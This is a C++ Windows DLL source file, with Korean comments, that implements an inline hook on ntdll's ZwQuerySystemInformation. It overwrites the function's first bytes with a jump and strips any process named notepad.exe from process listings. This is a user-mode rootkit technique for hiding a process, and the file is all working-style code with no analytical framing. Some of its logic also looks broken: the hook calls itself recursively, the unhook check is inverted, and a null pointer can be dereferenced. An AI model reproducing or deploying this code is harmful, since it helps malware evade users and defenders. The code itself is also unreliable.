// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
// 86 dll 임
#include<iostream>
#include<windows.h>
#include "tchar.h"
#include "pch.h"
#include "framework.h"

#define STATUS_SUCCESS						(0x00000000L) 
#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")

#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[] = TEXT("notepad.exe");
#pragma data_seg()

BYTE g_pOrgBytes[5] = { 0, };

BOOL Hook86(std::string DllName, std::string FuncName, PROC pfnNew, PBYTE pOrgBytes)
{
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = { 0xE9,0 };
    PBYTE pByte;

    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(DllName.c_str()), FuncName.c_str());
    pByte = (PBYTE)pfnOrg;

    if (pByte[0] == 0xE9)
        return FALSE;

    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    memcpy(pOrgBytes, pfnOrg, 5);

    dwAddress = (UINT_PTR)pfnNew - (UINT_PTR)pfnOrg - 5;
    memcpy(&pBuf[1], &dwAddress, 4);
    memcpy(pfnOrg, pBuf, 5);

    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);
    return TRUE;
}

BOOL UnHook(std::string DllName, std::string FuncName, PBYTE pOrgBytes)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;
    pFunc = GetProcAddress(GetModuleHandleA(DllName.c_str()), FuncName.c_str());
    pByte = (PBYTE)pFunc;

    if (pByte[0] == 0xE9)
        return FALSE;
    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    memcpy(pFunc, pOrgBytes, 5);

    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}

NTSTATUS WINAPI NewZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev{ 0, };
    char szProcName[MAX_PATH] = { 0, };

    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);

    status = ((t_NtQuerySystemInformation)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    if (status != STATUS_SUCCESS)
        goto __NTQUERYSYSTEMINFORMATION_END;

    if (SystemInformationClass == SystemProcessInformation)
    {
        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while (TRUE)
        {
            if (pCur->ImageName.Buffer != NULL)
            {
                if (!_tcsicmp((PWSTR)pCur->ImageName.Buffer, g_szProcName))
                {
                    if (pCur->NextEntryOffset == 0)
                        pPrev->NextEntryOffset = 0;
                    else
                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
                }
                else
                    pPrev = pCur;
            }
            if (pCur->NextEntryOffset == 0)
                break;
            pCur = (PSYSTEM_PROCESS_INFORMATION)((UINT_PTR)pCur + pCur->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    Hook86(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

    return status;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Hook86(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        UnHook(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
        break;
    }
    return TRUE;
}

